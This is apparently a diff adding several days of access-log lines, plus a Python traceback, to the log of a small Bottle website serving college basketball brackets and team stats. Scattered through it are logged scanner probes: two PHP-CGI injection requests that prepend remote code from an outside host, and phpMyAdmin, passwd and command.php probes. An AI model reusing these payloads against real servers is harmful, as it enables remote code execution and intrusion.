@@ -1811,3 +1811,141 @@ KeyError: 'Austin Peay'
 158.69.25.178 - - [29/Mar/2017 15:41:20] "GET / HTTP/1.1" 200 7152
 158.69.25.178 - - [29/Mar/2017 15:42:32] "GET / HTTP/1.1" 200 7152
 158.69.25.178 - - [29/Mar/2017 15:42:32] "GET /robots.txt HTTP/1.1" 404 752
+66.249.88.25 - - [29/Mar/2017 16:14:11] "GET / HTTP/1.1" 200 7152
+66.249.88.23 - - [29/Mar/2017 16:14:11] "GET /static/pto.PNG HTTP/1.1" 200 15017
+40.77.167.81 - - [29/Mar/2017 17:54:14] "GET / HTTP/1.1" 200 7152
+180.97.106.37 - - [29/Mar/2017 17:58:56] "HEAD http://180.163.113.82/check_proxy HTTP/1.1" 404 0
+40.77.167.81 - - [29/Mar/2017 20:15:41] "GET / HTTP/1.1" 200 7152
+67.164.229.210 - - [29/Mar/2017 21:14:46] "GET / HTTP/1.1" 200 7152
+67.164.229.210 - - [29/Mar/2017 21:14:46] "GET /static/pto.PNG HTTP/1.1" 304 0
+67.164.229.210 - - [29/Mar/2017 21:14:49] "GET /stats HTTP/1.1" 200 48600
+67.164.229.210 - - [29/Mar/2017 21:14:49] "GET /static/sorttable.js HTTP/1.1" 200 16877
+67.164.229.210 - - [29/Mar/2017 21:16:01] "GET /bracket HTTP/1.1" 200 44437
+67.164.229.210 - - [29/Mar/2017 21:16:02] "GET /static/bracket_dict_2017.JSON HTTP/1.1" 304 0
+67.164.229.210 - - [29/Mar/2017 21:16:03] "GET /static/probs.json HTTP/1.1" 304 0
+67.164.229.210 - - [29/Mar/2017 21:16:03] "GET /static/spreads2.json HTTP/1.1" 304 0
+67.164.229.210 - - [29/Mar/2017 21:16:03] "GET /static/team_images.JSON HTTP/1.1" 304 0
+169.54.244.84 - - [29/Mar/2017 21:31:03] "GET / HTTP/1.0" 200 7152
+37.115.186.195 - - [29/Mar/2017 21:55:23] "GET / HTTP/1.1" 200 7152
+37.115.186.195 - - [29/Mar/2017 21:55:24] "GET / HTTP/1.1" 200 7152
+37.115.186.195 - - [29/Mar/2017 21:55:25] "GET / HTTP/1.1" 200 7152
+176.8.251.60 - - [29/Mar/2017 22:39:17] "GET / HTTP/1.1" 200 7152
+176.8.251.60 - - [29/Mar/2017 22:39:18] "GET / HTTP/1.1" 200 7152
+176.8.251.60 - - [29/Mar/2017 22:39:19] "GET / HTTP/1.1" 200 7152
+191.96.249.97 - - [29/Mar/2017 22:41:33] "GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n HTTP/1.1" 404 1009
+46.118.122.226 - - [29/Mar/2017 22:58:34] "GET / HTTP/1.1" 200 7152
+46.118.122.226 - - [29/Mar/2017 22:58:35] "GET / HTTP/1.1" 200 7152
+46.118.122.226 - - [29/Mar/2017 22:58:35] "GET / HTTP/1.1" 200 7152
+77.75.78.167 - - [29/Mar/2017 23:03:16] "GET /robots.txt HTTP/1.1" 404 739
+77.75.78.167 - - [29/Mar/2017 23:03:17] "GET /bracket HTTP/1.1" 200 44437
+36.83.71.126 - - [29/Mar/2017 23:10:10] "GET / HTTP/1.0" 200 7152
+109.163.234.8 - - [29/Mar/2017 23:14:03] "GET / HTTP/1.1" 200 7152
+87.106.139.15 - - [30/Mar/2017 00:31:20] "GET /login HTTP/1.1" 404 732
+77.75.76.164 - - [30/Mar/2017 00:59:02] "GET /robots.txt HTTP/1.1" 404 739
+77.75.76.164 - - [30/Mar/2017 00:59:03] "GET /stats HTTP/1.1" 200 48600
+185.169.230.8 - - [30/Mar/2017 01:35:05] "GET / HTTP/1.0" 200 7152
+176.195.102.127 - - [30/Mar/2017 01:40:15] "GET / HTTP/1.1" 200 7152
+180.97.106.37 - - [30/Mar/2017 02:06:05] code 400, message Bad request syntax ('\x04\x01\x00P\xb4\xa3qR\x00')
+180.97.106.37 - - [30/Mar/2017 02:06:05] " P´£qR " 400 -
+77.75.77.72 - - [30/Mar/2017 02:45:16] "GET /robots.txt HTTP/1.1" 404 739
+77.75.77.72 - - [30/Mar/2017 02:45:17] "GET /projections HTTP/1.1" 200 16499
+66.249.69.186 - - [30/Mar/2017 03:32:06] "GET /robots.txt HTTP/1.1" 404 752
+66.249.69.182 - - [30/Mar/2017 03:32:06] "GET / HTTP/1.1" 200 7152
+46.118.122.226 - - [30/Mar/2017 04:10:04] "GET / HTTP/1.1" 200 7152
+46.118.122.226 - - [30/Mar/2017 04:10:05] "GET / HTTP/1.1" 200 7152
+46.118.122.226 - - [30/Mar/2017 04:10:05] "GET / HTTP/1.1" 200 7152
+180.97.106.161 - - [30/Mar/2017 04:40:43] code 400, message Bad request syntax ('\x05\x02\x00\x02')
+180.97.106.161 - - [30/Mar/2017 04:40:43] " " 400 -
+Traceback (most recent call last):
+  File "/home/skellert/anaconda2/lib/python2.7/site-packages/bottle.py", line 862, in _handle
+    return route.call(**args)
+  File "/home/skellert/anaconda2/lib/python2.7/site-packages/bottle.py", line 1740, in wrapper
+    rv = callback(*a, **ka)
+  File "run.py", line 56, in team_stats
+    return template("team_stats.html", url=url, stats=stats, teams=team_images, team=team)
+  File "/home/skellert/anaconda2/lib/python2.7/site-packages/bottle.py", line 3619, in template
+    return TEMPLATES[tplid].render(kwargs)
+  File "/home/skellert/anaconda2/lib/python2.7/site-packages/bottle.py", line 3409, in render
+    self.execute(stdout, env)
+  File "/home/skellert/anaconda2/lib/python2.7/site-packages/bottle.py", line 3396, in execute
+    eval(self.co, env)
+  File "/home/skellert/git/website/KellertAnalytics/team_stats.html", line 122, in <module>
+    <h1 style="text-align: left;float:left;"><img src={{teams[team]}} class="team_logo"></h1>
+KeyError: 'Indiana'
+63.243.252.163 - - [30/Mar/2017 04:41:33] "GET /team_stats/Indiana HTTP/1.1" 500 2042
+180.76.15.150 - - [30/Mar/2017 05:57:10] "GET /team_stats/Rhode_Island HTTP/1.1" 200 9037
+191.96.249.97 - - [30/Mar/2017 06:52:10] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 789
+40.77.167.118 - - [30/Mar/2017 07:09:00] "GET / HTTP/1.1" 200 7152
+185.169.230.8 - - [30/Mar/2017 07:12:57] "GET / HTTP/1.0" 200 7152
+23.247.27.18 - - [30/Mar/2017 07:21:19] "GET / HTTP/1.1" 200 7152
+77.75.78.168 - - [30/Mar/2017 08:17:50] "GET /robots.txt HTTP/1.1" 404 739
+77.75.78.168 - - [30/Mar/2017 08:17:51] "GET /powerrankings HTTP/1.1" 200 104009
+139.162.124.167 - - [30/Mar/2017 09:55:29] "GET / HTTP/1.1" 200 7152
+122.109.174.10 - - [30/Mar/2017 10:10:35] "GET / HTTP/1.0" 200 7152
+176.8.251.60 - - [30/Mar/2017 10:12:55] "GET / HTTP/1.1" 200 7152
+176.8.251.60 - - [30/Mar/2017 10:12:55] "GET / HTTP/1.1" 200 7152
+176.8.251.60 - - [30/Mar/2017 10:12:56] "GET / HTTP/1.1" 200 7152
+37.115.186.195 - - [30/Mar/2017 11:34:37] "GET / HTTP/1.1" 200 7152
+37.115.186.195 - - [30/Mar/2017 11:34:37] "GET / HTTP/1.1" 200 7152
+185.169.230.8 - - [30/Mar/2017 12:31:49] "GET / HTTP/1.0" 200 7152
+93.244.125.195 - - [30/Mar/2017 13:01:47] "GET / HTTP/1.0" 200 7152
+101.201.52.186 - - [30/Mar/2017 15:05:37] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 775
+46.118.115.43 - - [30/Mar/2017 15:59:54] "GET / HTTP/1.1" 200 7152
+46.118.115.43 - - [30/Mar/2017 15:59:54] "GET / HTTP/1.1" 200 7152
+46.118.115.43 - - [30/Mar/2017 15:59:54] "GET / HTTP/1.1" 200 7152
+46.118.115.43 - - [30/Mar/2017 15:59:54] "GET / HTTP/1.1" 200 7152
+60.191.38.78 - - [30/Mar/2017 16:25:37] "GET /current_config/passwd HTTP/1.1" 404 761
+66.102.6.93 - - [30/Mar/2017 16:50:58] "GET / HTTP/1.1" 200 7152
+66.102.6.93 - - [30/Mar/2017 16:50:58] "GET /static/pto.PNG HTTP/1.1" 200 15017
+185.40.4.169 - - [30/Mar/2017 17:38:26] code 400, message Bad request syntax ('\x16\x03\x01\x00\x96\x01\x00\x00\x92\x03\x03\xdf\x97d\x8b2\xca\xf4\x94#\\E\xa8\xabN\x05\x86\xf8\xcbm\xcc\xdf\x07\xd1\x07Z\x1e\x00\xe4N{W~\x00\x006\xc0,\xc0')
+185.40.4.169 - - [30/Mar/2017 17:38:26] " –  ’ß—d‹2Êô”#\E¨«N†øËmÌßÑZ äN{W~  6À,À" 400 -
+185.40.4.169 - - [30/Mar/2017 17:38:26] "GET /recordings/ HTTP/1.1" 404 741
+188.13.14.58 - - [30/Mar/2017 17:39:01] "GET / HTTP/1.0" 200 7152
+40.77.167.118 - - [30/Mar/2017 19:09:49] "GET / HTTP/1.1" 200 7152
+37.115.191.53 - - [30/Mar/2017 19:11:51] "GET / HTTP/1.1" 200 7152
+37.115.191.53 - - [30/Mar/2017 19:11:52] "GET / HTTP/1.1" 200 7152
+37.115.191.53 - - [30/Mar/2017 19:11:52] "GET / HTTP/1.1" 200 7152
+37.115.191.53 - - [30/Mar/2017 19:11:53] "GET / HTTP/1.1" 200 7152
+67.164.229.210 - - [30/Mar/2017 19:36:45] "GET / HTTP/1.1" 200 7152
+67.164.229.210 - - [30/Mar/2017 19:36:52] "GET /bracket HTTP/1.1" 200 44437
+139.162.114.70 - - [30/Mar/2017 20:13:48] "GET / HTTP/1.1" 200 7152
+173.252.123.132 - - [30/Mar/2017 20:56:09] "GET /static/pto.PNG HTTP/1.1" 200 15017
+54.234.85.9 - - [31/Mar/2017 01:16:44] "GET / HTTP/1.1" 200 7152
+185.110.132.232 - - [31/Mar/2017 02:57:57] "GET / HTTP/1.1" 200 7152
+67.164.229.210 - - [31/Mar/2017 05:09:21] "GET / HTTP/1.1" 200 7152
+67.164.229.210 - - [31/Mar/2017 05:09:21] "GET /static/pto.PNG HTTP/1.1" 304 0
+67.164.229.210 - - [31/Mar/2017 05:09:25] "GET /powerrankings HTTP/1.1" 200 104009
+180.76.15.30 - - [31/Mar/2017 06:20:22] "GET /robots.txt HTTP/1.1" 404 739
+180.76.15.143 - - [31/Mar/2017 06:20:22] "GET /robots.txt HTTP/1.1" 404 739
+180.76.15.160 - - [31/Mar/2017 06:20:38] "GET /team_stats/Minnesota HTTP/1.1" 200 9035
+66.249.64.51 - - [31/Mar/2017 06:44:13] "GET /robots.txt HTTP/1.1" 404 739
+66.249.64.53 - - [31/Mar/2017 06:44:13] "GET /powerrankings HTTP/1.1" 200 104009
+191.96.249.97 - - [31/Mar/2017 07:43:47] "GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n HTTP/1.1" 404 1009
+5.255.250.5 - - [31/Mar/2017 09:11:40] "GET /robots.txt HTTP/1.1" 404 756
+5.255.250.5 - - [31/Mar/2017 09:11:44] "GET /team_stats/MTSU HTTP/1.1" 200 9039
+141.8.143.219 - - [31/Mar/2017 09:11:48] "GET /team_stats/Princeton HTTP/1.1" 200 9035
+141.8.143.219 - - [31/Mar/2017 09:11:52] "GET /team_stats/SMU HTTP/1.1" 200 9029
+141.8.143.219 - - [31/Mar/2017 09:11:56] "GET /team_stats/North_Carolina HTTP/1.1" 200 9040
+5.255.250.5 - - [31/Mar/2017 09:11:59] "GET /team_stats/Northwestern HTTP/1.1" 200 9035
+5.255.250.5 - - [31/Mar/2017 09:12:03] "GET /team_stats/Nevada HTTP/1.1" 200 9030
+5.255.250.5 - - [31/Mar/2017 09:12:07] "GET /team_stats/Wichita_St HTTP/1.1" 200 9045
+5.255.250.5 - - [31/Mar/2017 09:12:11] "GET /team_stats/UNC_Wilmington HTTP/1.1" 200 9040
+5.255.250.5 - - [31/Mar/2017 09:12:14] "GET /team_stats/Florida_St HTTP/1.1" 200 9034
+5.255.250.5 - - [31/Mar/2017 09:12:18] "GET /team_stats/Dayton HTTP/1.1" 200 9031
+157.55.39.113 - - [31/Mar/2017 09:44:42] "GET /robots.txt HTTP/1.1" 404 752
+58.225.75.151 - - [31/Mar/2017 09:57:13] "GET /muieblackcat HTTP/1.1" 404 743
+58.225.75.151 - - [31/Mar/2017 09:57:13] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 776
+58.225.75.151 - - [31/Mar/2017 09:57:13] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 776
+58.225.75.151 - - [31/Mar/2017 09:57:14] "GET //pma/scripts/setup.php HTTP/1.1" 404 762
+58.225.75.151 - - [31/Mar/2017 09:57:14] "GET //myadmin/scripts/setup.php HTTP/1.1" 404 770
+58.225.75.151 - - [31/Mar/2017 09:57:15] "GET //MyAdmin/scripts/setup.php HTTP/1.1" 404 770
+54.196.104.181 - - [31/Mar/2017 10:39:01] "HEAD / HTTP/1.1" 200 0
+183.129.160.229 - - [31/Mar/2017 11:09:41] "GET /map_ports.html HTTP/1.1" 404 747
+187.38.56.144 - - [31/Mar/2017 11:37:42] "GET /cgi/common.cgi HTTP/1.0" 404 747
+187.38.56.144 - - [31/Mar/2017 11:37:42] "GET /stssys.htm HTTP/1.0" 404 739
+187.38.56.144 - - [31/Mar/2017 11:37:42] "GET / HTTP/1.0" 200 7152
+187.38.56.144 - - [31/Mar/2017 11:37:43] "POST /command.php HTTP/1.0" 404 741
+115.231.12.248 - - [31/Mar/2017 12:27:16] "GET / HTTP/1.1" 200 7152
+212.129.25.214 - - [31/Mar/2017 14:19:03] "GET / HTTP/1.0" 200 7152
+66.249.64.236 - - [31/Mar/2017 15:10:13] "GET /robots.txt HTTP/1.1" 404 756
+66.249.64.236 - - [31/Mar/2017 15:10:13] "GET /team_stats/static/sorttable.js HTTP/1.1" 404 796
